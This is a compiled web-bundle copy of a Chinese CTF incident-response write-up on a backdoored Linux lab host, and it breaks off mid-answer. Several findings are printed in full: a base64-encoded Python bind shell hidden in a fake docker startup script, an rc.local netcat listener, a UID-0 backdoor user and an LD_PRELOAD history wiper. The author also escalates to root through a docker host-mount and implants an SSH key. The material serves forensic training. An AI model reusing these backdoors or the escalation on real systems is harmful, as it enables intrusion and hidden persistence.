"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[4197],{40233:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>i,contentTitle:()=>a,default:()=>h,frontMatter:()=>r,metadata:()=>d,toc:()=>o});var c=s(85893),l=s(11151);const r={},a="Linux \u540e\u95e8\u5e94\u6025",d={id:"Xuanji/Incident Response/95",title:"Linux \u540e\u95e8\u5e94\u6025",description:"1",source:"@site/docs/Xuanji/Incident Response/95.md",sourceDirName:"Xuanji/Incident Response",slug:"/Xuanji/Incident Response/95",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Incident Response/95",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Xuanji/Incident Response/95.md",tags:[],version:"current",frontMatter:{},sidebar:"Xuanji_Sidebar",previous:{title:"\u9493\u9c7c\u4e8b\u4ef6\u5e94\u6025",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Incident Response/94"},next:{title:"\u54e5\u65af\u62c9 ekp \u7248\u672c\u6d41\u91cf\u5206\u6790",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Incident Response/96"}},i={},o=[{value:"1",id:"1",level:2},{value:"2",id:"2",level:2},{value:"3",id:"3",level:2},{value:"4",id:"4",level:2},{value:"5",id:"5",level:2},{value:"6",id:"6",level:2},{value:"7",id:"7",level:2},{value:"8",id:"8",level:2},{value:"9",id:"9",level:2},{value:"10",id:"10",level:2},{value:"11",id:"11",level:2}];function t(e){const n={blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,l.a)(),...e.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(n.header,{children:(0,c.jsx)(n.h1,{id:"linux-\u540e\u95e8\u5e94\u6025",children:"Linux \u540e\u95e8\u5e94\u6025"})}),"\n",(0,c.jsx)(n.h2,{id:"1",children:"1"}),"\n",(0,c.jsxs)(n.blockquote,{children:["\n",(0,c.jsxs)(n.p,{children:["\u4e3b\u673a\u540e\u95e8\u7528\u6237\u540d\u79f0\uff1a\u63d0\u4ea4\u683c\u5f0f\u5982\uff1a",(0,c.jsx)(n.code,{children:"flag{backdoor}"})]}),"\n"]}),"\n",(0,c.jsxs)(n.p,{children:["\u68c0\u67e5 ",(0,c.jsx)(n.code,{children:"/etc/passwd"})," \u6587\u4ef6\uff0c\u53d1\u73b0"]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-plaintext",children:"backdoor:x:0:0:root:/root:/bin/bash\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u5373\u53ef\u786e\u5b9a\u7b54\u6848"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-flag",children:"flag{backdoor}\n"})}),"\n",(0,c.jsx)(n.h2,{id:"2",children:"2"}),"\n",(0,c.jsxs)(n.blockquote,{children:["\n",(0,c.jsxs)(n.p,{children:["\u4e3b\u673a\u6392\u67e5\u9879\u4e2d\u53ef\u4ee5\u53d1\u73b0\u5230 flag"," \u5185\u4ee5 i \u5f00\u5934\u7684 flag\uff0c\u5982 ",(0,c.jsx)(n.code,{children:"flag{ixxxxxxx}"})]}),"\n"]}),"\n",(0,c.jsxs)(n.p,{children:["\u4e0a\u4f20 ",(0,c.jsx)(n.code,{children:"linpeas.sh"})," \u8fdb\u884c\u6392\u67e5\uff0c\u53d1\u73b0\u8fdb\u7a0b\u4fe1\u606f\u4e2d\u6709\u4ee5\u4e0b\u8bb0\u5f55"]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-plaintext",children:"root       498  0.0  0.1   6724  3212 ?        S    20:17   0:00 bash\nroot       505  0.0  0.0   2368  1696 ?        S    20:17   0:00  _ nc -lvp 9999 -c flag{infoFl4g}\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u5373\u53ef\u786e\u5b9a\u7b54\u6848"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-flag",children:"flag{infoFl4g}\n"})}),"\n",(0,c.jsx)(n.h2,{id:"3",children:"3"}),"\n",(0,c.jsxs)(n.blockquote,{children:["\n",(0,c.jsxs)(n.p,{children:["\u4e3b\u673a\u6392\u67e5\u53d1\u73b0 9999 \u7aef\u53e3\u662f\u901a\u8fc7\u54ea\u4e2a\u914d\u7f6e\u6587\u4ef6\u5982\u4f55\u5f00\u673a\u542f\u52a8\u7684\uff0c\u5982 ",(0,c.jsx)(n.code,{children:"/etc/crontab"})," \u5219\u586b\u5199 ",(0,c.jsx)(n.code,{children:"/etc/crontab"})," \u7684 md5 \uff0c\u63d0\u4ea4\u65b9\u5f0f\u793a\u4f8b\uff1a",(0,c.jsx)(n.code,{children:"flag{md5}"})]}),"\n"]}),"\n",(0,c.jsx)(n.p,{children:"\u68c0\u67e5\u8fdb\u7a0b\u4fe1\u606f"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-shell",children:"(remote) user@ip-10-0-10-4:/home/user$ ps -o ppid= -p 498\n    1\n\nroot         1  0.0  0.4 103896 10056 ?        Ss   20:15   0:01 /sbin/init\n"})}),"\n",(0,c.jsxs)(n.p,{children:["\u90a3\u4e48\u8bf4\u660e\uff0c\u8be5\u8fdb\u7a0b\u7531 ",(0,c.jsx)(n.code,{children:"init"})," \u6216 ",(0,c.jsx)(n.code,{children:"systemd"})," \u542f\u52a8\u7684"]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-plaintext",metastring:'title="systemctl status"',children:"\u25cf ip-10-0-10-4\n    State: degraded\n     Jobs: 0 queued\n   Failed: 1 units\n    Since: Thu 2024-11-14 20:15:19 EST; 40min ago\n   CGroup: /\n           \u2514\u2500system.slice\n             \u251c\u2500rc-local.service\n             \u2502 \u251c\u2500498 bash\n             \u2502 \u2514\u250014393 nc -lvp 9999 -c flag{infoFl4g}\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u67e5\u770b\u670d\u52a1\u72b6\u6001"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-shell",children:"(remote) user@ip-10-0-10-4:/home/user$ systemctl status rc-local.service\n\u25cf rc-local.service - /etc/rc.local Compatibility\n   Loaded: loaded (/etc/systemd/system/rc-local.service; enabled; vendor preset: enabled)\n  Drop-In: /usr/lib/systemd/system/rc-local.service.d\n           \u2514\u2500debian.conf\n   Active: active (running) since Thu 2024-11-14 20:17:15 EST; 44min ago\n  Process: 489 ExecStart=/etc/rc.d/rc.local start (code=exited, status=0/SUCCESS)\n Main PID: 498 (bash)\n    Tasks: 2 (limit: 2356)\n   Memory: 8.9M\n   CGroup: /system.slice/rc-local.service\n           \u251c\u2500  498 bash\n           \u2514\u250014393 nc -lvp 9999 -c flag{infoFl4g}\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u67e5\u770b\u670d\u52a1\u6587\u4ef6\uff0c\u627e\u5230"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-plaintext",metastring:'title="/etc/rc.d/rc.local"',children:"#!/bin/bash\n\necho d2hpbGUgdHJ1ZTtkbyBub2h1cCBuYyAtbHZwIDk5OTkgLWMgImZsYWd7aW5mb0ZsNGd9IiAyPiYxIDtzbGVlcCAxO2RvbmU7 | base64 -d | nohup bash &\nexit 0\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u8ba1\u7b97\u8def\u5f84\u54c8\u5e0c"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-plaintext",children:"/etc/rc.d/rc.local -> cf8a978fe83579e2e20ec158524d8c06\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u5373\u53ef\u786e\u5b9a\u7b54\u6848"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-flag",children:"flag{cf8a978fe83579e2e20ec158524d8c06}\n"})}),"\n",(0,c.jsx)(n.h2,{id:"4",children:"4"}),"\n",(0,c.jsxs)(n.blockquote,{children:["\n",(0,c.jsxs)(n.p,{children:["\u9ed1\u5ba2 3s \u505a\u4e86\u8bb0\u5f55\u6240\u6709\u7528\u6237\u7684\u6bcf\u6b21\u767b\u9646\u7684\u5bc6\u7801\u7684\u624b\u6bb5\uff0cflag \u4e3a\u9ed1\u5ba2\u8bb0\u5f55\u7684\u767b\u9646\u5bc6\u7801\u65e5\u5fd7\u8def\u5f84 md5, \u63d0\u4ea4\u65b9\u5f0f\u793a\u4f8b\uff1a",(0,c.jsx)(n.code,{children:"flag{md5(\u8def\u5f84)}"})]}),"\n"]}),"\n",(0,c.jsx)(n.p,{children:"\u6839\u636e\u6392\u67e5\uff0c\u5b9a\u4f4d\u5230\u6587\u4ef6"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-plaintext",children:"(remote) user@ip-10-0-10-4:/tmp$ ls -lh .sshlog\n-rw-r--r-- 1 root root 18 Nov 14 20:18 .sshlog\n(remote) user@ip-10-0-10-4:/tmp$ cat .sshlog\nuser :Atmbctfer!\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u8ba1\u7b97\u54c8\u5e0c"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-plaintext",children:"/tmp/.sshlog -> 8997d5a1b8dcca5a4be75962250959f7\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u5373\u53ef\u786e\u5b9a\u7b54\u6848"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-flag",children:"flag{8997d5a1b8dcca5a4be75962250959f7}\n"})}),"\n",(0,c.jsx)(n.h2,{id:"5",children:"5"}),"\n",(0,c.jsxs)(n.blockquote,{children:["\n",(0,c.jsxs)(n.p,{children:["\u7ed9\u51fa\u4f7f\u7528\u4e86 ",(0,c.jsx)(n.code,{children:"/bin/bash"})," \u7684 RCE \u540e\u95e8\u8fdb\u7a0b\u540d\u79f0 + \u7aef\u53e3\u53f7 \u5982\u8fdb\u7a0b\u540d\u79f0\u4e3a sshd\uff0c\u7aef\u53e3\u53f7\u4e3a 22\uff0c\u5219 ",(0,c.jsx)(n.code,{children:"flag{sshd22}"})]}),"\n"]}),"\n",(0,c.jsx)(n.p,{children:"\u5bf9\u8fdb\u7a0b\u5217\u8868\u4ee5\u53ca\u76d1\u542c\u7aef\u53e3\u7ee7\u7eed\u6392\u67e5\uff0c\u53d1\u73b0"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-plaintext",children:"user      1263  0.0  0.4  16084  9604 ?        S    20:17   0:00 python3\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u4ee5\u53ca"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-plaintext",metastring:'title="netstat -anopt"',children:"tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      1263/python3         off (0.00/0/0)\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u5c1d\u8bd5\u4ea4\u4e92"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-shell",children:"(remote) user@ip-10-0-10-4:/tmp$ nc 127.0.0.1 8080\nwhoami\nuser\npwd\n/home/user\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u5373\u53ef\u786e\u5b9a\u7b54\u6848"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-flag",children:"flag{python38080}\n"})}),"\n",(0,c.jsx)(n.h2,{id:"6",children:"6"}),"\n",(0,c.jsxs)(n.blockquote,{children:["\n",(0,c.jsxs)(n.p,{children:["\u627e\u51fa\u5f00\u673a\u542f\u52a8\u7684\u540e\u95e8\u670d\u52a1\u540d\u79f0 MD5\uff0c\u63d0\u4ea4 ",(0,c.jsx)(n.code,{children:"flag{md5(\u670d\u52a1\u540d)}"})]}),"\n"]}),"\n",(0,c.jsx)(n.p,{children:"\u5217\u51fa\u6240\u6709\u8bbe\u5b9a\u4e3a\u5f00\u673a\u542f\u52a8\u7684\u670d\u52a1"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-shell",children:"(remote) user@ip-10-0-10-4:/etc/rc.d$ systemctl list-unit-files --type=service | grep enabled\napache2.service                        enabled\napparmor.service                       enabled\nautovt@.service                        enabled\ncloud-config.service                   enabled\ncloud-final.service                    enabled\ncloud-init-local.service               enabled\ncloud-init.service                     enabled\nconsole-setup.service                  enabled\ncron.service                           enabled\ndbus-org.freedesktop.timesync1.service enabled\ndocker-compose-app.service             enabled\ndocker.service                         enabled\ngetty@.service                         enabled\nkeyboard-setup.service                 enabled\nnetworking.service                     enabled\nrc-local.service                       enabled\nrc.local.service                       enabled\nrsyslog.service                        enabled\nssh.service                            enabled\nsshd.service                           enabled\nsyslog.service                         enabled\nsystemd-fsck-root.service              enabled-runtime\nsystemd-timesyncd.service              enabled\n"})}),"\n",(0,c.jsxs)(n.p,{children:["\u67e5\u770b ",(0,c.jsx)(n.code,{children:"docker-compose-app.service"})]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-shell",children:"(remote) user@ip-10-0-10-4:/etc/rc.d$ systemctl status docker-compose-app.service\n\u25cf docker-compose-app.service - Docker Compose Application\n   Loaded: loaded (/etc/systemd/system/docker-compose-app.service; enabled; vendor preset: enabled)\n   Active: failed (Result: exit-code) since Thu 2024-11-14 20:17:20 EST; 51min ago\n  Process: 1382 ExecStart=/bin/bash /usr/lib/python3.7/site-packages/docker/startup.sh (code=exited, status=0/SUCCESS)\n  Process: 1397 ExecStop=/usr/bin/docker-compose down (code=exited, status=203/EXEC)\n Main PID: 1382 (code=exited, status=0/SUCCESS)\n    Tasks: 1 (limit: 2356)\n   Memory: 45.8M\n   CGroup: /system.slice/docker-compose-app.service\n           \u2514\u25001263 python3\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u67e5\u770b\u5177\u4f53\u7684\u6587\u4ef6"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-shell",children:"(remote) user@ip-10-0-10-4:/etc/rc.d$ cat /etc/systemd/system/docker-compose-app.service\n[Unit]\nDescription=Docker Compose Application\nAfter=network.target docker.service\n\n[Service]\nType=simple\nWorkingDirectory=/home/user/\nExecStart=/bin/bash /usr/lib/python3.7/site-packages/docker/startup.sh\nExecStop=/usr/bin/docker-compose down\nRestart=always\nUser=user\nTimeoutStartSec=0\nTimeoutStopSec=0\nKillMode=process\n\n[Install]\nWantedBy=multi-user.target\n(remote) user@ip-10-0-10-4:/etc/rc.d$ cat /usr/lib/python3.7/site-packages/docker/startup.sh\n#!/bin/bash\n/usr/local/bin/docker-compose -f /home/user/nginx/docker-compose.yml up -d\n\necho 'import base64;v=base64.b64decode(\"aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcwoKIyBDcmVhdGUgc29ja2V0IG9iamVjdApzID0gc29ja2V0LnNvY2tldCgpCnMuYmluZCgoJycsIDgwODApKQpzLmxpc3RlbigxKQoKIyBDb250aW51b3VzbHkgYWNjZXB0IGNvbm5lY3Rpb25zCndoaWxlIFRydWU6CiAgICBjb25uLCBhZGRyID0gcy5hY2NlcHQoKQogICAgdHJ5OgogICAgICAgICMgTGF1bmNoIGJhc2ggc2hlbGwgY29ubmVjdGVkIHRvIHRoaXMgc29ja2V0CiAgICAgICAgc3VicHJvY2Vzcy5jYWxsKFsnL2Jpbi9iYXNoJ10sIHN0ZGluPWNvbm4sIHN0ZG91dD1jb25uLCBzdGRlcnI9Y29ubikKICAgIGZpbmFsbHk6CiAgICAgICAgIyBFbnN1cmUgdGhlIGNvbm5lY3Rpb24gaXMgY2xvc2VkIGFmdGVyIHVzZQogICAgICAgIGNvbm4uY2xvc2UoKQo=\");exec(v)'|nohup python3 &\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u5f88\u660e\u663e\u5c31\u662f\u540e\u95e8\u6587\u4ef6"}),"\n",(0,c.jsx)(n.p,{children:"\u8ba1\u7b97\u670d\u52a1\u540d\u54c8\u5e0c"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-plaintext",children:"docker-compose-app.service -> 5213e47de16522f1dc3f9e9ecc0ab8b0\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u5373\u53ef\u786e\u5b9a\u7b54\u6848"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-flag",children:"flag{5213e47de16522f1dc3f9e9ecc0ab8b0}\n"})}),"\n",(0,c.jsx)(n.h2,{id:"7",children:"7"}),"\n",(0,c.jsxs)(n.blockquote,{children:["\n",(0,c.jsx)(n.p,{children:"\u6e17\u900f\u63d0\u6743\u83b7\u5f97 root \u76ee\u5f55\u4e0b\u7684 flag"}),"\n"]}),"\n",(0,c.jsx)(n.p,{children:"\u76f4\u63a5\u501f\u52a9 docker \u6765\u5b9e\u73b0"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-shell",children:"(remote) user@ip-10-0-10-4:/etc/rc.d$ docker images\nREPOSITORY   TAG       IMAGE ID       CREATED        SIZE\nphp          fpm       4dcccbe325c2   2 months ago   499MB\nnginx        1         39286ab8a5e1   3 months ago   188MB\n(remote) user@ip-10-0-10-4:/etc/rc.d$ docker run --rm -v /:/host -it nginx:1 /bin/bash\nroot@08d963657d93:/# ls -lh /host/root/\ntotal 4.0K\n-r-------- 1 root root 16 Sep 24 09:51 flag\nroot@08d963657d93:/# cat /host/root/flag\nflag{ATMB_root}\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u5373\u53ef\u5f97\u5230\u7b54\u6848"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-flag",children:"flag{ATMB_root}\n"})}),"\n",(0,c.jsx)(n.h2,{id:"8",children:"8"}),"\n",(0,c.jsxs)(n.blockquote,{children:["\n",(0,c.jsxs)(n.p,{children:["\u9ed1\u5ba2 3s \u57cb\u4e86\u4e00\u4e2a flag \u5728\u6743\u9650\u7ef4\u6301\u8fc7\u7a0b\u4e2d\u7684\u5730\u65b9\uff0c\u53ef\u4ee5\u53d1\u73b0 flag"," \u62ec\u53f7\u5185\u7684\u9996\u5b57\u6bcd\u662f c \u5f00\u5934\uff0c\u5982 ",(0,c.jsx)(n.code,{children:"flag{cxxxxxxx}"})]}),"\n"]}),"\n",(0,c.jsx)(n.p,{children:"\u6784\u5efa\u4e00\u4e2a ssh \u5bc6\u94a5\u5bf9"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ ssh-keygen -b 4096 -t rsa\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/randark/.ssh/id_rsa): 20241125_id_rsa\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\nYour identification has been saved in 20241125_id_rsa\nYour public key has been saved in 20241125_id_rsa.pub\nThe key fingerprint is:\nSHA256:xOQiuoPMppwUWWAckFg+KvRNwOA9QKVbUa60inZLsV8 randark@kali\nThe key's randomart image is:\n+---[RSA 4096]----+\n|*X*+..  .        |\n|=o=.+  +         |\n| +o*.o. +        |\n|..Bo*. o         |\n|o+.= .  S        |\n|=.o.o            |\n|oBo+   E         |\n|* +.o .          |\n|.o . .           |\n+----[SHA256]-----+\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ ls -lh | grep id_rsa\n-rw------- 1 randark randark 3.4K Nov 15 10:17 20241125_id_rsa\n-rw-r--r-- 1 randark randark  738 Nov 15 10:17 20241125_id_rsa.pub\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ base64 20241125_id_rsa.pub\nc3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFDQVFEelZrbmRTWkhYbHVFSGRYUUZF\nT2NDdnZkRXh6dC95NHIxMWtGWUsybUFFM2hTN1RoZDN6SS9WTDFQYzNDRTVIVS9wOWlubm5lUjNL\nOW4ydEc3SS9mOUJjZ3IwVzZDZnNSdkpROFpVYmI4QWVRR0ROR2ZjZzIzUk5mYkdXRm1xVUE2dExW\nYy8vYmJXYXM1L2srT2gvSWFCaWpLOUl1dUI4NUFNcXNYWnF0dVU3Q1BJdWpNdERoS1Jtd0hHUnRr\nQjJuMkVGMlIvL2wwZFllRGNoZzZaelBTTGxCMjV2Uk51QTQ5bDhlc2ViaXA4YlpWaS8yQ0tKRkg4\nN3ArcWJMZ3dxWU5nOXpJZmdaSFNLOVhvMGdFUWVvV1poTG1IaTlqdjZDQklzS2JTb0k0UEpsNjJJ\nOWJFdVB3dGhidk5CMytiOUtYRkF1RTBPd3RWNmdGc2REaDFwV0wxVDBGNzhXRlN5MTd2ZVQ5aWt6\nb01NOU1Fd0FOb3FRYkdYb3BqNEs1UU1MS0ttc3ZhZm1QblpkZkpKcENrL24vd2FzdmNJbUZ1QlVl\naUhQVXh1UmhoamFsTUJCV2U2SmxuZnYwbTMzNkpCK0pjbXhpajBlL0pQQ3FrWWtTZGZWL21lcTB5\nL3B1bmg5ZzdFVVNhRHBYNnFxRENMelM4dncySmkvVWxvOFczQkZ5S0FvTjY5Z2JoYzI4TU1PWjJO\nZGxPakxnNlc1eUJ0TWxHaEZWUnVydGdTU29PQ0dTY3VmTVVKaXR6S1lmZzhUcDZiNldVQXgrb3Bw\nZmY5VEYvZDRvWDkzek9QMWtUcXdJY2xYeitadisrQ1gwNlRyRmF6cCtwL05YU3pDRzRBOCs3cTFj\naUZwMTZXRDIwNzV2WisvR2dkOUlTSWFnZFMwR1hzNWF2MFdxTnc9PSByYW5kYXJrQGthbGkK\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u7136\u540e\u501f\u52a9 docker \u690d\u5165\u4e3b\u673a"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-shell",children:"root@08d963657d93:/host/root/.ssh# pwd\n/host/root/.ssh\nroot@08d963657d93:/host/root/.ssh# ls -laih\ntotal 8.0K\n2486 drwx------ 2 root root 4.0K Nov 15 01:17 .\n 206 drwx------ 6 root root 4.0K Nov 15 01:17 ..\n2487 -rw------- 1 root root    0 Nov 15 01:17 authorized_keys\nroot@08d963657d93:/host/root/.ssh# echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFDQVFEelZrbmRTWkhYbHVFSGRYUUZFT2NDdnZkRXh6dC95NHIxMWtGWUsybUFFM2hTN1RoZDN6SS9WTDFQYzNDRTVIVS9wOWlubm5lUjNLOW4ydEc3SS9mOUJjZ3IwVzZDZnNSdkpROFpVYmI4QWVRR0ROR2ZjZzIzUk5mYkdXRm1xVUE2dExWYy8vYmJXYXM1L2srT2gvSWFCaWpLOUl1dUI4NUFNcXNYWnF0dVU3Q1BJdWpNdERoS1Jtd0hHUnRrQjJuMkVGMlIvL2wwZFllRGNoZzZaelBTTGxCMjV2Uk51QTQ5bDhlc2ViaXA4YlpWaS8yQ0tKRkg4N3ArcWJMZ3dxWU5nOXpJZmdaSFNLOVhvMGdFUWVvV1poTG1IaTlqdjZDQklzS2JTb0k0UEpsNjJJOWJFdVB3dGhidk5CMytiOUtYRkF1RTBPd3RWNmdGc2REaDFwV0wxVDBGNzhXRlN5MTd2ZVQ5aWt6b01NOU1Fd0FOb3FRYkdYb3BqNEs1UU1MS0ttc3ZhZm1QblpkZkpKcENrL24vd2FzdmNJbUZ1QlVlaUhQVXh1UmhoamFsTUJCV2U2SmxuZnYwbTMzNkpCK0pjbXhpajBlL0pQQ3FrWWtTZGZWL21lcTB5L3B1bmg5ZzdFVVNhRHBYNnFxRENMelM4dncySmkvVWxvOFczQkZ5S0FvTjY5Z2JoYzI4TU1PWjJOZGxPakxnNlc1eUJ0TWxHaEZWUnVydGdTU29PQ0dTY3VmTVVKaXR6S1lmZzhUcDZiNldVQXgrb3BwZmY5VEYvZDRvWDkzek9QMWtUcXdJY2xYeitadisrQ1gwNlRyRmF6cCtwL05YU3pDRzRBOCs3cTFjaUZwMTZXRDIwNzV2WisvR2dkOUlTSWFnZFMwR1hzNWF2MFdxTnc9PSByYW5kYXJrQGthbGkK | base64 -d > authorized_keys\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u6210\u529f\u62ff\u4e0b root"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ pwncat-cs -i 20241125_id_rsa root@52.83.4.231 -p 222\n[10:20:29] Welcome to pwncat \ud83d\udc08!\n[10:20:34] 52.83.4.231:222: registered new host w/ db\n(local) pwncat$ back\n(remote) root@ip-10-0-10-4:/root# whoami\nroot\n"})}),"\n",(0,c.jsxs)(n.p,{children:["\u5728 ",(0,c.jsx)(n.code,{children:"cron"})," \u7684\u65e5\u5fd7\u4e2d\uff0c\u627e\u5230\u4ee5\u4e0b\u8bb0\u5f55"]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-shell",children:'(remote) root@ip-10-0-10-4:/home/user# journalctl | grep "cron" | grep flag\nNov 14 20:18:01 ip-10-0-10-4 CRON[1399]: (root) CMD (echo flag{cr0nt4b_IRfind};^Mno crontab for root                                                                                                   )\n'})}),"\n",(0,c.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,c.jsx)(n.code,{children:"crontab -e"})," \u4e5f\u53ef\u4ee5\u627e\u5230"]}),"\n",(0,c.jsx)(n.p,{children:"\u5373\u53ef\u5f97\u5230\u7b54\u6848"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-flag",children:"flag{cr0nt4b_IRfind}\n"})}),"\n",(0,c.jsx)(n.h2,{id:"9",children:"9"}),"\n",(0,c.jsxs)(n.blockquote,{children:["\n",(0,c.jsx)(n.p,{children:"\u9ed1\u5ba2 3s \u505a\u4e86\u4e00\u4e2a root \u7528\u6237\u6267\u884c cat \u547d\u4ee4\u5c31\u5220\u9664\u6587\u4ef6\u7684\u64cd\u4f5c\uff0c\u8bf7\u53d1\u73b0\u5220\u9664\u4e86\u4ec0\u4e48\u6587\u4ef6\u5c06\u6587\u4ef6\u540d\u4f5c\u4e3a flag \u63d0\u4ea4"}),"\n"]}),"\n",(0,c.jsxs)(n.p,{children:["\u5bf9 ",(0,c.jsx)(n.code,{children:"/root/.bashrc"})," \u8fdb\u884c\u68c0\u67e5"]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-plaintext",children:"# ~/.bashrc: executed by bash(1) for non-login shells.\n\n# Note: PS1 and umask are already set in /etc/profile. You should not\n# need this unless you want different defaults for root.\n# PS1='${debian_chroot:+($debian_chroot)}\\h:\\w\\$'\n# umask 022\n\n# You may uncomment the following lines if you want `ls' to be colorized:\n# export LS_OPTIONS='--color=auto'\n# eval \"`dircolors`\"\n# alias ls='ls $LS_OPTIONS'\n# alias ll='ls $LS_OPTIONS -l'\n# alias l='ls $LS_OPTIONS -lA'\nexport LD_PRELOAD=/home/user/Nomal.so\n# Some more alias to avoid making mistakes:\n# alias rm='rm -i'\n# alias cp='cp -i'\n# alias mv='mv -i'\n"})}),"\n",(0,c.jsxs)(n.p,{children:["\u53d1\u73b0 ",(0,c.jsx)(n.code,{children:"/home/user/Nomal.so"})," \u6587\u4ef6\u52ab\u6301\u4e86\u4ee5\u4e0b\u64cd\u4f5c"]}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{alt:"img",src:s(78546).Z+"",width:"1855",height:"806"})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-c",children:'system("rm -rf ~/.bash_history>/dev/null 2>&1");\n'})}),"\n",(0,c.jsx)(n.p,{children:"\u5373\u53ef\u786e\u5b9a\u7b54\u6848"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-flag",children:"flag{.bash_history}\n"})}),"\n",(0,c.jsx)(n.h2,{id:"10",children:"10"}),"\n",(0,c.jsxs)(n.blockquote,{children:["\n",(0,c.jsxs)(n.p,{children:["\u9ed1\u5ba2 3s \u5f88\u6267\u7740\u6e05\u7406\u75d5\u8ff9\uff0c\u5e76\u505a\u4e86\u4e00\u4e2a\u6301\u7eed\u5220\u75d5\u8ff9\u7684\u624b\u6bb5\uff0c\u8bf7\u53d1\u73b0\u624b\u6bb5\u5e76\u7ed9\u51fa\u5220\u9664\u7684\u5b8c\u6574\u9ed1\u5ba2\u5220\u9664\u547d\u4ee4\u7684 md5\uff0c\u5982 ",(0,c.jsx)(n.code,{children:"flag{md5(rm -f /var/log/ssh.log>/dev/stdout)}"})]}),"\n"]}),"\n",(0,c.jsx)(n.p,{children:"\u4e0a\u4e00\u9898\u4e2d\u5c31\u6709"}),"\n",(0,c.jsx)(n.p,{children:"\u8ba1\u7b97\u54c8\u5e0c"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-plaintext",children:"rm -rf ~/.bash_history >/dev/null 2>&1 -> 